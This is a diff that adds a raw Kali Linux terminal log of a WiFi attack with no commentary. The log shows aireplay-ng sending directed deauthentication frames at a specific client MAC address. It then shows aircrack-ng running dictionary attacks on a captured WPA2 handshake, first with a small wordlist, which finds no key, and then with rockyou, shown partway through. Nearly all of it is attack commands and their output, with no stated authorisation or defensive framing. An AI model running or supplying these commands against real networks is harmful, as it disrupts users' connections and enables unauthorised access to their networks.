@@ -1,0 +1,94 @@
+──(kali㉿kali)-[~]
+└─$ sudo su
+[sudo] password for kali: 
+┌──(root㉿kali)-[/home/kali]
+└─# aireplay-ng -0 100 -a 1A:F5:B4:17:9E:C6 -c D2:EE:F4:17:FC:32 wlan0mon                         
+02:32:19  Waiting for beacon frame (BSSID: 1A:F5:B4:17:9E:C6) on channel 11
+02:32:19  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [11|52 ACKs]
+02:32:20  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 1|52 ACKs]
+02:32:21  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 1|51 ACKs]
+02:32:21  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 3|43 ACKs]
+02:32:22  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|50 ACKs]
+02:32:23  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 2|54 ACKs]
+02:32:23  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|58 ACKs]
+02:32:24  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 1|58 ACKs]
+02:32:25  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|65 ACKs]
+02:32:26  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|56 ACKs]
+02:32:26  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|61 ACKs]
+02:32:27  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|48 ACKs]
+02:32:28  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|46 ACKs]
+02:32:29  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|45 ACKs]
+02:32:30  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|48 ACKs]
+02:32:30  Sending 64 directed DeAuth (code 7). STMAC: [D2:EE:F4:17:FC:32] [ 0|55 ACKs]
+^C
+                                                                                                      
+┌──(root㉿kali)-[/home/kali]
+└─# aircrack-ng -a2 -b 1A:F5:B4:17:9E:C6 -w '/home/kali/Desktop/word.lst' '/home/test-07.cap'
+Reading packets, please wait...
+Opening /home/test-07.cap
+Resetting EAPOL Handshake decoder state.
+Read 62014 packets.
+
+1 potential targets
+
+
+
+                               Aircrack-ng 1.7 
+
+      [00:00:36] 106868/106867 keys tested (2984.85 k/s) 
+
+      Time left: -1485193726 day, 6 hours, 36 minutes, 48 seconds    100.00%
+
+                                KEY NOT FOUND
+
+
+      Master Key     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+
+
+                                                                                                      
+┌──(root㉿kali)-[/home/kali]
+└─# aircrack-ng -a2 -b 1A:F5:B4:17:9E:C6 -w '/home/kali/Desktop/rockyou.lst' '/home/test-07.cap'
+Reading packets, please wait...
+Opening /home/test-07.cap
+Resetting EAPOL Handshake decoder state.
+Read 62014 packets.
+
+1 potential targets
+
+
+
+
+                               Aircrack-ng 1.7 
+
+      [00:04:42] 798417/14344392 keys tested (2871.35 k/s) 
+
+      Time left: 1 hour, 18 minutes, 37 seconds                  5.57%
+
+                       Current passphrase:                            
+
+
+      Master Key     : A3 55 4C B4 0A 57 6C 41 4B 3F E2 C1 CB B7 96 75 
+                       12 9D 20 04 EE B6 1D F7 F7 62 AE 68 F6 99 0C A3 
+
+      Transient Key  : 99 99 99 99 F3 23 F2 90 20 C6 9A 37 E5 03 32 C9 
+                       24 3C B0 FE D3 CC 3E 11 8C D8 12 5E 18 ED 27 C9 
+                       6D 1E AB 14 73 CC 37 33 E8 A3 35 80 13 41 17 13 
+                       B9 48 EC C5 C6 F8 DC 73 9F EA A2 47 E7 C3 65 DD 
+
+      EAPOL HMAC     : 8A 07 1F 6C 29 15 39 4B 7E BA AE 13 C5 35 09 4F 
+
+                                                                                                      
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
